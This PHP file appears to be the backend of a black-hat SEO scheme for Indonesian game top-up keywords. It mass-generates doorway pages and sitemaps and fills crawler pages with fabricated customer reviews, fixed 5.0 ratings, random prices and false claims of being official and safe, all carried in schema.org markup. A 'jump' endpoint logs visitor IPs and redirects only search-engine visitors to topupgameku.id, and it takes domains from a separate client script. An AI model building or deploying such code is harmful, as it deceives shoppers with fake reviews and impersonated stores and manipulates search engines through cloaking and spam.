<?php
// index-endpoint.php
// Versi Final - Fokus pada SEO Endpoint & Caching

error_reporting(0);

// --- KONFIGURASI & DEFINISI GLOBAL ---
define('LOG_FILE', __DIR__ . '/visitor_logs.json'); 

// --- PENGATURAN DATA & CACHE ---
define('DATA_DIR', __DIR__ . '/data');
define('CACHE_ENABLED', true);
define('CACHE_DIR', __DIR__ . '/cache');
define('CACHE_EXPIRY', 86400); // 24 jam


/**
 * Fungsi untuk mendapatkan IP address klien yang paling akurat.
 * @return string
 */
function get_client_ip(): string
{
    if (isset($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) return trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    if (isset($_SERVER['HTTP_X_REAL_IP'])) return $_SERVER['HTTP_X_REAL_IP'];
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN_IP';
}

// Fungsi slugify global
function slugify(string $text): string
{
    $text = preg_replace('~[^\pL\d]+~u', '-', $text);
    $text = iconv('utf-8', 'us-ascii//TRANSLIT', $text);
    $text = preg_replace('~[^-\w]+~', '', $text);
    $text = trim($text, '-');
    $text = preg_replace('~-+~', '-', $text);
    $text = strtolower($text);
    return empty($text) ? 'n-a' : $text;
}

// Fungsi format tanggal Indonesia
function date_indo(string $date_format, string $timestamp = null): string
{
    $timestamp = $timestamp ?? time();
    $bulan_indo = [
        'January' => 'Januari', 'February' => 'Februari', 'March' => 'Maret', 'April' => 'April',
        'May' => 'Mei', 'June' => 'Juni', 'July' => 'Juli', 'August' => 'Agustus',
        'September' => 'September', 'October' => 'Oktober', 'November' => 'November', 'December' => 'Desember'
    ];
    return strtr(date($date_format, $timestamp), $bulan_indo);
}

header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");

// --- DATABASE GLOBAL (DIMUAT DARI FILE JSON) ---
$games_list = json_decode(file_get_contents(DATA_DIR . '/games.json'), true);
$stores_list = json_decode(file_get_contents(DATA_DIR . '/stores.json'), true);
$games_images = json_decode(file_get_contents(DATA_DIR . '/images.json'), true);


// --- FUNGSI BARU UNTUK KONSISTENSI BERDASARKAN DOMAIN ---
function get_consistent_index(string $string, int $max_index): int
{
    if ($max_index <= 0) return 0;
    return crc32($string) % $max_index;
}


function get_dynamic_sitemaps(): array
{
    global $games_list, $stores_list;
    $sitemap_files = [];

    foreach ($stores_list as $store_name) {
        $store_slug = slugify($store_name);
        $sitemap_files[] = $store_slug . '.xml';
    }

    foreach ($games_list as $game_name => $item_name) {
        $slug_game = slugify($game_name);
        $sitemap_files[] = $slug_game . '.xml';
    }
    return $sitemap_files;
}


function handle_page_sitemap_generation(string $segment_type, string $target_segment, string $segment_dir, array $games_list): array
{
    $final_slug_list = [];
    $max_urls = 1000;
    $base_slugs = []; 

    if ($segment_type === 'store') {
        $store_action_variations = ['top-up', 'beli', 'harga-promo', 'voucher-diskon'];
        foreach ($games_list as $game_name => $item_name) {
            foreach($store_action_variations as $action) {
                $base_slugs[] = slugify("{$action} {$game_name} {$item_name} di {$target_segment}");
            }
        }
    } elseif ($segment_type === 'game') {
        $target_item = $games_list[$target_segment] ?? 'item';
        $action_variations = ['top-up', 'beli', 'harga', 'voucher', 'promo', 'diskon'];
        $adjective_variations = ['termurah', 'tercepat', 'aman', 'legal', 'resmi', 'instan', 'kilat'];

        foreach ($action_variations as $action) {
            foreach ($adjective_variations as $adjective) {
                $base_slugs[] = slugify("{$action} {$target_item} {$target_segment} {$adjective}");
            }
        }
    }

    if (empty($base_slugs)) {
        return [];
    }

    $counter = 1;
    while (count($final_slug_list) < $max_urls) {
        $current_base_slug = $base_slugs[($counter - 1) % count($base_slugs)];
        $unique_slug = "{$current_base_slug}-a{$counter}";
        $full_path = "{$segment_dir}/{$unique_slug}";
        $final_slug_list[] = $full_path;
        $counter++;
    }

    return $final_slug_list;
}

function get_all_seo_slugs(): array
{
    global $games_list, $stores_list;
    $all_slugs = [];

    foreach ($stores_list as $store_name) {
        $store_slug = slugify($store_name);
        $all_slugs = array_merge($all_slugs, handle_page_sitemap_generation('store', $store_name, $store_slug, $games_list));
    }

    foreach ($games_list as $game_name => $item_name) {
        $game_slug = slugify($game_name);
        $all_slugs = array_merge($all_slugs, handle_page_sitemap_generation('game', $game_name, $game_slug, $games_list));
    }

    return array_unique($all_slugs);
}

function generate_internal_links(string $current_path, string $segment_dir, string $segment_type, string $target_segment, array $games_list): string
{
    $all_possible_slugs = handle_page_sitemap_generation($segment_type, $target_segment, $segment_dir, $games_list);

    $filtered_slugs = array_filter($all_possible_slugs, function($slug) use ($current_path) {
        return $slug !== $current_path;
    });

    if (count($filtered_slugs) < 4) {
        return '';
    }

    $random_keys = array_rand($filtered_slugs, 4);
    $selected_links = array_map(function($key) use ($filtered_slugs) {
        return $filtered_slugs[$key];
    }, $random_keys);

    $html = "<nav class='internal-links' aria-label='Navigasi Internal'><h3 class='sub-title'>Top Up Populer Lainnya</h3><ul>";

    foreach ($selected_links as $link_path) {
        $anchor_text_base = preg_replace('/-a\d+$/', '', basename($link_path));
        $anchor_text = ucwords(str_replace('-', ' ', $anchor_text_base));
        $html .= "<li><a href='/{$link_path}'>{$anchor_text}</a></li>";
    }

    $html .= "</ul></nav>";
    return $html;
}


// --- FUNGSI UTAMA & ROUTING (DIPERBARUI) ---
$action = filter_input(INPUT_GET, 'action', FILTER_SANITIZE_STRING);
$request_path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

// Logika baru untuk menangani permintaan .xml secara langsung
if (substr($request_path, -4) === '.xml') {
    // Jika sitemap index, gunakan action 'sitemap'
    if (basename($request_path) === 'sitemap.xml') {
        $action = 'sitemap';
    } else {
    // Jika sitemap individu, gunakan action 'map'
        $action = 'map';
    }
}

if (!$action) {
    $action = basename($request_path);
}
$domain = filter_input(INPUT_POST, 'domain', FILTER_SANITIZE_URL);
if (!$domain) {
    $scheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
    $domain = $scheme . '://' . $_SERVER['HTTP_HOST'];
}
$uri = ltrim($request_path, '/');
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $uri_post = filter_input(INPUT_POST, 'uri', FILTER_SANITIZE_URL);
    if ($uri_post) {
        $uri = ltrim(parse_url($uri_post, PHP_URL_PATH) ?: $uri_post, '/');
    }
}
$ip = filter_input(INPUT_POST, 'ip', FILTER_SANITIZE_STRING) ?? get_client_ip();

switch ($action) {
    case 'robots':
        header("Content-Type: text/plain; charset=utf-8");
        handle_robots($domain);
        break;
    case 'sitemap':
        header("Content-Type: text/xml; charset=utf-8");
        handle_sitemap_index($domain, $uri);
        break;
    case 'map':
        header("Content-Type: text/xml; charset=utf-8");
        handle_page_sitemap($domain, $uri, $GLOBALS['games_list']);
        break;
    case 'list':
        header("Content-Type: application/json; charset=utf-8");
        echo json_encode(get_all_seo_slugs());
        break;
    case 'jump':
        handle_jump($domain, $ip);
        break;
    case 'indata':
        if (CACHE_ENABLED) {
            $cache_key = $domain . $uri;
            $cache_file = CACHE_DIR . '/' . md5($cache_key) . '.html';

            if (file_exists($cache_file) && (time() - filemtime($cache_file)) < CACHE_EXPIRY) {
                readfile($cache_file);
                exit;
            }
            ob_start();
        }

        handle_crawler_content($domain, $uri, $GLOBALS['games_list'], $GLOBALS['stores_list']);

        if (CACHE_ENABLED) {
            $content = ob_get_flush();
            if (!is_dir(CACHE_DIR)) {
                mkdir(CACHE_DIR, 0755, true);
            }
            file_put_contents($cache_file, $content);
        }
        break;
    case 'stats':
        header("Content-Type: application/json; charset=utf-8");
        handle_get_stats();
        break;
    case 'meta':
        // ### PERUBAHAN DI SINI: Ambil domain dari GET parameter ###
        $preview_uri = filter_input(INPUT_GET, 'uri', FILTER_SANITIZE_STRING);
        $preview_domain = filter_input(INPUT_GET, 'domain', FILTER_SANITIZE_URL);

        if ($preview_uri && $preview_domain) {
            header("Content-Type: application/json; charset=utf-8");
            // Teruskan domain klien ke fungsi handle_get_meta_data
            handle_get_meta_data($preview_domain, ltrim($preview_uri, '/'), $GLOBALS['games_list'], $GLOBALS['stores_list']);
        } else {
            header("HTTP/1.0 400 Bad Request");
            die(json_encode(['error' => 'Parameter "uri" dan "domain" dibutuhkan untuk preview meta.']));
        }
        break;
    default:
        header("HTTP/1.0 404 Not Found");
        echo "Endpoint not found.";
        break;
}

// --- FUNGSI-FUNGSI HANDLER ---

function handle_get_stats()
{
    $stats = ['total_redirects' => 0, 'referrer_breakdown' => []];
    if (file_exists(LOG_FILE)) {
        $log_content = file_get_contents(LOG_FILE);
        $log_lines = explode(",\n", trim($log_content, ",\n"));
        $log_data = [];
        foreach($log_lines as $line) {
            if (empty($line)) continue;
            $data = json_decode(trim($line), true);
            if ($data) $log_data[] = $data;
        }
        $stats['total_redirects'] = count($log_data);
        $referrer_breakdown = [];
        foreach ($log_data as $entry) {
            $referrer = $entry['referrer'] ?? 'Direct / Unknown';
            $parsed_url = parse_url($referrer);
            $domain_host = str_replace('www.', '', ($parsed_url['host'] ?? 'Direct / Unknown'));
            @$referrer_breakdown[$domain_host]++;
        }
        arsort($referrer_breakdown);
        $stats['referrer_breakdown'] = $referrer_breakdown;
    }
    header('Content-Type: application/json');
    echo json_encode($stats);
}


function handle_get_meta_data(string $domain, string $uri, array $games_list, array $stores_list): void
{
    $result = generate_seo_meta($domain, $uri, $games_list, $stores_list);
    $domain_root = rtrim($domain, '/');
    $url = "{$domain_root}/" . $uri;
    echo json_encode([
        'title' => $result['title'],
        'description' => $result['description'],
        'url' => $url,
        'rating_value' => '5.0',
        'rating_count' => rand(1500, 5000),
    ]);
}

function handle_jump(string $domain, string $ip): void
{
    $referrer = $_SERVER['HTTP_REFERER'] ?? '';
    // ### PERUBAHAN DI SINI ###
    // Ambil domain klien dari data POST yang dikirim oleh index-client.php
    $client_domain = filter_input(INPUT_POST, 'domain', FILTER_SANITIZE_URL) ?? 'UNKNOWN_DOMAIN';

    $is_search_engine_referrer = (
        strpos($referrer, 'google.com') !== false || 
        strpos($referrer, 'bing.com') !== false ||
        strpos($referrer, 'yahoo.com') !== false ||
        strpos($referrer, 'duckduckgo.com') !== false
    );
    
    if ($is_search_engine_referrer) {
        $log_entry = [
            'timestamp' => date('Y-m-d H:i:s'),
            'ip' => $ip,
            'referrer' => $referrer,
            'action' => 'redirect',
            'domain' => $client_domain, // Simpan domain klien ke log
            'uri' => filter_input(INPUT_POST, 'uri') ?? '/'
        ];
        
        $log_data = json_encode($log_entry) . ",\n";
        @file_put_contents(LOG_FILE, $log_data, FILE_APPEND | LOCK_EX);
        
        $destination_url = 'https://topupgameku.id/'; 
        
        header("Location: " . $destination_url, true, 301);
        exit();

    } else {
         header("HTTP/1.0 403 Forbidden");
         die("Access denied. Jump endpoint requires search engine referral.");
    }
}
function get_random_description(string $domain, string $type, string $game, string $item, string $store = null): string
{
    global $stores_list;
    $featured_stores = array_rand(array_flip($stores_list), 3);
    $store_1 = $featured_stores[0];
    $store_2 = $featured_stores[1];
    if ($type === 'store') {
        $templates = [
            "Kami adalah partner resmi <strong>{$store}</strong> untuk semua kebutuhan {$item} {$game} Anda. Proses kami super instan, memastikan Anda bisa langsung kembali ke permainan. Transaksi dijamin aman, legal, dan didukung penuh oleh {$store}.",
            "Temukan harga terbaik untuk {$item} {$game} di halaman ini. Kami membandingkan harga dari {$store_1} dan {$store_2} untuk memberikan Anda penawaran paling hemat. <strong>{$store}</strong> adalah pilihan utama bagi gamer cerdas.",
            "Layanan top up tercepat untuk {$game} kini tersedia melalui platform <strong>{$store}</strong>. Dapatkan bonus eksklusif dan pastikan {$item} Anda masuk 100% aman ke akun Anda. Kami menjamin tidak ada penipuan, semua transaksi resmi.",
        ];
    } else {
        $templates = [
            "Selamat datang di pusat top up resmi <strong>{$item} {$game}</strong>. Platform kami menjamin layanan tercepat, termurah, dan 100% aman. Kami selalu memantau harga dari {$store_1} dan {$store_2} agar Anda mendapatkan deal terbaik.",
            "Butuh {$item} {$game} secara mendadak? Kami solusinya! Dengan sistem pembayaran lengkap dan dukungan pelanggan 24/7, Anda tidak perlu khawatir lagi tentang transaksi top up yang lambat atau mahal.",
            "Kumpulan promo dan diskon spesial untuk {$item} {$game} ada di sini. Pilih jumlah {$item} yang Anda perlukan dan nikmati proses kilat yang hanya butuh beberapa detik setelah pembayaran dikonfirmasi.",
        ];
    }
    $index = get_consistent_index($domain, count($templates));
    return $templates[$index];
}

function generate_seo_meta(string $domain, string $uri, array $games_list, array $stores_list): array
{
    $current_game_name = null;
    $current_item_name = null;
    $current_store_name = null;
    $slug_with_suffix = basename($uri);
    $slug = preg_replace('/-a\d+$/', '', $slug_with_suffix);
    $uri_parts = explode('/', $uri);
    $segment_dir = $uri_parts[0];
    $slug_content = $uri_parts[1] ?? $slug;
    $is_store_specific_page = false;
    $segment_type = 'game';
    $target_segment = '';
    foreach ($stores_list as $store_name_check) {
        if (slugify($store_name_check) === $segment_dir) {
            $is_store_specific_page = true;
            $current_store_name = $store_name_check;
            $segment_type = 'store';
            $target_segment = $store_name_check;
            break;
        }
    }
    if ($is_store_specific_page) {
        foreach($games_list as $game => $item) {
            if(strpos($slug_content, slugify($game)) !== false) {
                $current_game_name = $game;
                $current_item_name = $item;
                break;
            }
        }
        if (!$current_game_name) {
            $current_game_name = array_rand($games_list);
            $current_item_name = $games_list[$current_game_name];
        }
    } else {
        foreach($games_list as $game => $item) {
            if(slugify($game) === $segment_dir) {
                $current_game_name = $game;
                $current_item_name = $item;
                $target_segment = $game;
                break;
            }
        }
        if (!$current_game_name) {
            $current_game_name = array_rand($games_list);
            $current_item_name = $games_list[$current_game_name];
            $target_segment = $current_game_name;
        }
    }
    $keyword_from_slug = str_replace('-', ' ', $slug);
    $featured_stores = array_rand(array_flip($GLOBALS['stores_list']), 3);
    $featured_store_1_name = $featured_stores[0];
    $featured_store_2_name = $featured_stores[1];
    $domain_key = parse_url($domain, PHP_URL_HOST);
    if ($is_store_specific_page) {
        $title_templates = [
            "Top Up {$current_item_name} {$current_game_name} di {$current_store_name} | Harga Termurah & Resmi",
            "Beli {$current_item_name} {$current_game_name} di {$current_store_name} | Proses Kilat & Aman",
            "Harga Diskon {$current_item_name} {$current_game_name} {$keyword_from_slug} | Beli via {$current_store_name}",
        ];
        $description_templates = [
            "Dapatkan {$current_item_name} {$current_game_name} langsung melalui {$current_store_name}. Terjamin 100% aman, proses instan, dan harga paling murah dibandingkan {$featured_store_2_name}. Beli sekarang dan nikmati bonus eksklusif!",
            "Cara mudah beli {$current_item_name} {$current_game_name} di {$current_store_name}. Layanan 24 jam, pembayaran lengkap, dan dijamin paling murah. Alternatif terbaik selain {$featured_store_1_name}.",
        ];
    } else {
        $title_templates = [
            "{$current_game_name} - {$current_item_name} {$keyword_from_slug} | Termurah " . date('Y'),
            "Top Up {$current_item_name} {$current_game_name} | Alternatif Selain {$featured_store_1_name} & {$featured_store_2_name}",
            "Beli {$current_item_name} {$current_game_name} Murah: Promo Terbaru Hari Ini",
        ];
        $description_templates = [
            "Cari tempat top up {$current_item_name} {$current_game_name} paling murah? Dapatkan harga terbaik di sini, lebih hemat dari {$featured_store_1_name} dan {$featured_store_2_name}. Proses instan, 100% aman dan legal.",
            "Dapatkan {$current_item_name} untuk {$current_game_name} dengan harga diskon dan proses super cepat. Kami menyediakan berbagai metode pembayaran. Pilihan terbaik untuk semua gamer di Indonesia.",
            "Beli {$current_item_name} {$current_game_name} {$keyword_from_slug} sekarang juga. Layanan 24 jam non-stop, transaksi dijamin aman dan terpercaya. Pilihan utama para gamers.",
        ];
    }
    $title_index = get_consistent_index($domain_key, count($title_templates));
    $desc_index = get_consistent_index($domain_key, count($description_templates));
    $title = $title_templates[$title_index];
    $description = $description_templates[$desc_index];
    return [
        'title' => $title, 'description' => $description, 'uri' => $uri,
        'game_name' => $current_game_name, 'item_name' => $current_item_name, 'store_name' => $current_store_name,
        'is_store_specific' => $is_store_specific_page,
        'segment_dir' => $segment_dir, 'segment_type' => $segment_type, 'target_segment' => $target_segment
    ];
}

function generate_faq_html_and_schema(string $game, string $item, string $store = null): array
{
    $questions = [
        ["q" => "Bagaimana cara top up {$item} {$game} di sini?", "a" => "Sangat mudah! Cukup pilih jumlah {$item} yang Anda inginkan, selesaikan pembayaran melalui metode yang tersedia, dan {$item} akan langsung masuk ke akun Anda dalam hitungan detik."],
        ["q" => "Apakah transaksi di sini aman dan legal?", "a" => "Tentu saja. Kami menjamin semua transaksi 100% aman, legal, dan resmi. Kami bekerja sama dengan penyedia terpercaya untuk memastikan keamanan akun Anda."],
        ["q" => "Metode pembayaran apa saja yang diterima?", "a" => "Kami menerima berbagai metode pembayaran populer, termasuk transfer bank, e-wallet (GoPay, DANA, OVO), dan pembayaran melalui minimarket terdekat."],
        ["q" => "Berapa lama proses pengiriman {$item}?", "a" => "Proses pengiriman kami sangat cepat. Setelah pembayaran Anda terkonfirmasi, {$item} akan dikirim ke akun Anda secara instan, biasanya kurang dari 1 menit."]
    ];
    if ($store) {
        $questions[] = ["q" => "Apakah ini resmi dari {$store}?", "a" => "Benar, kami adalah platform alternatif terpercaya yang menyediakan layanan top up {$item} {$game} dengan kualitas dan kecepatan setara, seringkali dengan harga yang lebih kompetitif."];
    }
    $html = "<section class='faq-section' aria-labelledby='faq-title'><h2 id='faq-title' class='sub-title'>Pertanyaan Umum (FAQ)</h2>";
    $schema = ["@type" => "FAQPage", "mainEntity" => []];
    foreach ($questions as $q) {
        $html .= "<details class='faq-item'><summary class='faq-question'>{$q['q']}</summary><div class='faq-answer'><p>{$q['a']}</p></div></details>";
        $schema['mainEntity'][] = ["@type" => "Question", "name" => $q['q'], "acceptedAnswer" => ["@type" => "Answer", "text" => $q['a']]];
    }
    $html .= "</section>";
    return ['html' => $html, 'schema' => $schema];
}

function handle_crawler_content(string $domain, string $uri, array $games_list, array $stores_list): void
{
    global $games_images;
    $meta = generate_seo_meta($domain, $uri, $games_list, $stores_list);
    $title = $meta['title'];
    $description = $meta['description'];
    $keywords = "top up {$meta['uri']}, beli {$meta['uri']}, harga {$meta['uri']}";
    $current_game_name = $meta['game_name'];
    $current_item_name = $meta['item_name'];
    $current_store_name = $meta['store_name'];
    $is_store_specific_page = $meta['is_store_specific'];
    $slug_with_suffix = basename($uri);
    $slug_clean = preg_replace('/-a\d+$/', '', $slug_with_suffix);
    $keyword_from_slug = str_replace('-', ' ', $slug_clean);
    $featured_store_1_name = array_rand(array_flip($GLOBALS['stores_list']));
    $featured_store_3_name = array_rand(array_flip($GLOBALS['stores_list']));
    $random_price = rand(10000, 50000);
    $game_image_url = $games_images[$current_game_name] ?? "https://placehold.co/600x400/1E1E1E/FFFFFF?text=" . slugify($current_game_name);
    $domain_key = parse_url($domain, PHP_URL_HOST);
    $intro_paragraph = get_random_description($domain_key, $is_store_specific_page ? 'store' : 'game', $current_game_name, $current_item_name, $current_store_name);
    $product_image_html = "<img src='{$game_image_url}' alt='Top Up {$current_item_name} {$current_game_name}' class='product-image'>";
    if ($is_store_specific_page) {
        $intro_title = "Cara Top Up {$current_item_name} {$current_game_name} di {$current_store_name}";
        $benefits_list = "<li><span class='icon'>&#9989;</span> <strong>Resmi & Terpercaya:</strong> Transaksi via {$current_store_name} terjamin 100% legal.</li><li><span class='icon'>&#9889;</span> <strong>Proses Kilat:</strong> Pengiriman instan tanpa jeda.</li><li><span class='icon'>&#128179;</span> <strong>Pembayaran Lengkap:</strong> Bayar via GoPay, Dana, dll.</li><li><span class='icon'>&#128176;</span> <strong>Harga Terbaik:</strong> Dijamin paling kompetitif.</li>";
    } else {
        $intro_title = "Mengapa Top Up {$current_item_name} {$current_game_name} Disini?";
        $benefits_list = "<li><span class='icon'>&#9989;</span> <strong>Harga Kompetitif:</strong> Lebih murah dari {$featured_store_1_name} & {$featured_store_3_name}.</li><li><span class='icon'>&#9889;</span> <strong>Proses Instan:</strong> Hanya 1 detik setelah pembayaran.</li><li><span class='icon'>&#128179;</span> <strong>Pembayaran Lengkap:</strong> Semua metode pembayaran diterima.</li><li><span class='icon'>&#128172;</span> <strong>Layanan 24/7:</strong> Tim support siap membantu kapan saja.</li>";
    }
    $intro_section = "<section class='content-section' aria-labelledby='intro-title'><h2 id='intro-title' class='sub-title'>{$intro_title}</h2><div class='intro-content'>{$product_image_html}<div><p>{$intro_paragraph}</p><ul class='benefit-list'>{$benefits_list}</ul></div></div></section>";
    $price_table_section = "<section class='content-section price-section' aria-labelledby='price-title'><h2 id='price-title' class='sub-title'>Daftar Harga Populer {$current_item_name}</h2><table><thead><tr><th>Jumlah {$current_item_name}</th><th>Harga Promo</th><th>Status</th></tr></thead><tbody><tr><td>100 {$current_item_name}</td><td>Rp " . number_format(rand(10000, 15000), 0, ',', '.') . "</td><td><span class='status-ready'>Ready</span></td></tr><tr><td>250 {$current_item_name} + Bonus</td><td>Rp " . number_format(rand(20000, 25000), 0, ',', '.') . "</td><td><span class='status-ready'>Ready</span></td></tr><tr><td>500 {$current_item_name} (Best Deal)</td><td>Rp " . number_format(rand(40000, 50000), 0, ',', '.') . "</td><td><span class='status-ready'>Ready</span></td></td></tr></tbody></table></section>";
    $internal_links_section = generate_internal_links($uri, $meta['segment_dir'], $meta['segment_type'], $meta['target_segment'], $games_list);
    $faq_data = generate_faq_html_and_schema($current_game_name, $current_item_name, $current_store_name);
    $faq_section = $faq_data['html'];
    $rating_count = rand(1500, 5000);
    $review_count = rand(5, 10);
    $reviews = [];
    $review_names = ["Budi S.", "Santi M.", "Rizal P.", "Nadia A.", "Fajar R.", "Dian T.", "Yoga B."];
    $review_texts = ["Proses {$keyword_from_slug} super cepat, adminnya ramah. Recommended!", "Harga {$current_item_name} paling murah dibanding toko lain. Puas banget.", "Baru pertama kali coba, langsung instan masuk. Terbaik!", "Selalu langganan di sini, tidak pernah ada masalah.", "Top up aman dan legal. Mantap!", "Respon cepat, saya beri 5 bintang.", "Setelah bayar langsung masuk, ga pake lama. Keren!", "Akhirnya nemu tempat top up termurah."];
    $review_html = "<section class='reviews-container' aria-labelledby='review-title'><h2 id='review-title' class='sub-title'>Ulasan Pelanggan (Rating 5.0)</h2>";
    for($i = 0; $i < $review_count; $i++) {
        $author = $review_names[array_rand($review_names)];
        $review_text = $review_texts[array_rand($review_texts)];
        $date = date('Y-m-d', time() - rand(0, 30) * 86400);
        $reviews[] = ["@type" => "Review", "reviewRating" => ["@type" => "Rating", "ratingValue" => "5"], "author" => ["@type" => "Person", "name" => $author], "reviewBody" => $review_text, "datePublished" => $date];
        $review_html .= "<article class='review-card'><div class='review-header'><span class='star-rating' aria-label='5 dari 5 bintang'>&#9733;&#9733;&#9733;&#9733;&#9733;</span><span class='review-author'>{$author}</span></div><blockquote class='review-body'>\"{$review_text}\"</blockquote><span class='review-date'>Diterbitkan: " . date_indo('d M Y', strtotime($date)) . "</span></article>";
    }
    $review_html .= "</section>";
    $canonical_url = rtrim($domain, '/') . '/' . $uri;
    $canonical_tag = "<link rel=\"canonical\" href=\"{$canonical_url}\">";
    $json_ld_schemas = ["@context" => "https://schema.org", "@graph" => [["@type" => "Product", "name" => $title, "description" => $description, "image" => $game_image_url, "sku" => "TOPUP-{$slug_clean}", "brand" => ["@type" => "Brand", "name" => $current_game_name], "offers" => ["@type" => "Offer", "url" => $canonical_url, "priceCurrency" => "IDR", "price" => "{$random_price}", "priceValidUntil" => "2026-12-31", "availability" => "https://schema.org/InStock", "seller" => ["@type" => "Organization", "name" => $domain]], "aggregateRating" => ["@type" => "AggregateRating", "ratingValue" => "5.0", "bestRating" => "5", "worstRating" => "5", "ratingCount" => "{$rating_count}", "reviewCount" => count($reviews)], "review" => $reviews], ["@type" => "BreadcrumbList", "itemListElement" => [["@type" => "ListItem", "position" => 1, "name" => "Home", "item" => rtrim($domain, '/')], ["@type" => "ListItem", "position" => 2, "name" => $meta['segment_type'] === 'store' ? $current_store_name : $current_game_name, "item" => rtrim($domain, '/') . '/' . $meta['segment_dir']], ["@type" => "ListItem", "position" => 3, "name" => ucwords($keyword_from_slug)]]], $faq_data['schema']]];
    $json_ld_script = '<script type="application/ld+json">' . json_encode($json_ld_schemas) . '</script>';
    $tgl_update = date_indo('d F Y');
    echo <<<HTML
<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>{$title}</title><meta name="description" content="{$description}"><meta name="keywords" content="{$keywords}">{$canonical_tag}
    <style>
        :root{--primary-color:#007bff;--secondary-color:#28a745;--background-color:#f8f9fa;--card-background:#ffffff;--text-color:#343a40;--shadow:0 4px 12px rgba(0,0,0,0.08);--border-radius:12px;}
        body{font-family:'Poppins',sans-serif;line-height:1.7;background-color:var(--background-color);color:var(--text-color);margin:0;padding:0;}
        .container{max-width:1000px;margin:2rem auto;padding:0 1rem;}
        .page-header{background-color:var(--primary-color);color:white;padding:2rem 1rem;margin-bottom:2rem;box-shadow:var(--shadow);border-radius:var(--border-radius);}
        h1{font-size:clamp(1.8rem, 5vw, 2.5rem);margin:0;text-align:center;font-weight:700;line-height:1.2;}
        h2,h3{color:var(--primary-color);border-bottom:3px solid var(--primary-color);padding-bottom:8px;margin-top:2.5rem;font-weight:600;}
        .content-section,.faq-section,.reviews-container,.internal-links{background:var(--card-background);padding:1.5rem;border-radius:var(--border-radius);box-shadow:var(--shadow);margin-bottom:2rem;}
        .intro-content{display:grid;grid-template-columns:1fr;gap:1.5rem;align-items:center;}
        @media(min-width: 768px){.intro-content{grid-template-columns:250px 1fr;}}
        .product-image{width:100%;max-width:250px;height:auto;display:block;margin:0 auto;border-radius:var(--border-radius);box-shadow:var(--shadow);}
        .benefit-list{list-style:none;padding:0;margin-top:1rem;}
        .benefit-list li{background:#e9f7ee;padding:12px 15px;margin-bottom:10px;border-radius:8px;display:flex;align-items:center;font-weight:500;}
        .icon{font-size:1.4rem;margin-right:12px;color:var(--secondary-color);}
        table{width:100%;border-collapse:collapse;margin:1.5rem 0;}
        th,td{border:1px solid #dee2e6;padding:14px;text-align:left;}
        th{background-color:var(--primary-color);color:white;font-weight:600;text-align:center;}
        tr:nth-child(even){background-color:#f2f2f2;}
        .status-ready{color:var(--secondary-color);font-weight:600;display:inline-block;padding:5px 10px;background:#e9f7ee;border-radius:20px;}
        .faq-item{border-bottom:1px solid #eee;margin-bottom:1rem;}
        .faq-question{font-weight:600;cursor:pointer;padding:1rem 0;position:relative;width:100%;text-align:left;background:none;border:none;font-size:1rem;}
        .faq-question::after{content:'+';position:absolute;right:10px;font-size:1.5rem;transition:transform .2s;}
        .faq-item[open] .faq-question::after{transform:rotate(45deg);}
        .faq-answer{padding:0 1rem 1rem;color:#555;}
        .reviews-container{margin-top:2.5rem;}
        .review-card{background:#fff;padding:1.5rem;margin-bottom:1.5rem;border-radius:var(--border-radius);border-left:5px solid var(--secondary-color);box-shadow:0 2px 5px rgba(0,0,0,0.05);}
        .review-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:0.5rem;}
        .star-rating{color:gold;font-size:1.1rem;}
        .review-author{font-weight:600;color:var(--primary-color);}
        .review-body{font-style:italic;margin:0.5rem 0;color:#555;padding-left:1rem;border-left:3px solid #f0f0f0;}
        .review-date{display:block;font-size:0.8rem;color:#888;text-align:right;margin-top:0.5rem;}
        .internal-links ul{list-style:none;padding:0;display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1rem;}
        .internal-links li a{display:block;padding:12px;background:#f1f1f1;border-radius:8px;text-decoration:none;color:var(--primary-color);font-weight:600;transition:all .2s;}
        .internal-links li a:hover{background:#e1e1e1;transform:translateY(-2px);}
        .page-footer{text-align:center;padding:2rem 0;margin-top:2rem;color:#6c757d;font-size:0.9rem;}
        .page-footer p{margin:5px 0;}
    </style>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    {$json_ld_script}
</head>
<body>
    <div class="container">
        <header class="page-header"><h1>{$title}</h1></header>
        <main>
            {$intro_section}
            {$price_table_section}
            {$internal_links_section}
            {$faq_section}
            {$review_html}
        </main>
        <footer class="page-footer">
            <p>Terima kasih telah memilih kami sebagai solusi top up game terpercaya Anda.</p>
            <p>Rating rata-rata: <span class="star-rating" aria-label="5 dari 5 bintang">&#9733;&#9733;&#9733;&#9733;&#9733;</span> <strong>5.0</strong> dari {$rating_count} ulasan. (Update: {$tgl_update})</p>
        </footer>
    </div>
</body></html>
HTML;
}

function handle_sitemap_index(string $domain, string $uri): void
{
    $domain_root = rtrim($domain, '/');
    $xml = new SimpleXMLElement('<?xml version="1.0" encoding="UTF-8"?><sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"></sitemapindex>');
    $dynamic_sitemaps = get_dynamic_sitemaps();
    foreach ($dynamic_sitemaps as $sitemap_file) {
        $sitemap_node = $xml->addChild('sitemap');
        $sitemap_node->addChild('loc', "{$domain_root}/{$sitemap_file}");
        $sitemap_node->addChild('lastmod', date('Y-m-d', time() - rand(0, 365 * 86400)));
    }
    echo $xml->asXML();
}

function handle_robots(string $domain): void
{
    $domain_root = rtrim($domain, '/');
    $content = "User-agent: *\nAllow: /\n\n";
    $content .= "Sitemap: {$domain_root}/sitemap.xml\n";
    $content .= "Sitemap: {$domain_root}/allsitemap.xml\n";
    $dynamic_sitemaps = get_dynamic_sitemaps();
    foreach($dynamic_sitemaps as $sitemap_file) {
        $content .= "Sitemap: {$domain_root}/{$sitemap_file}\n";
    }
    echo $content;
}

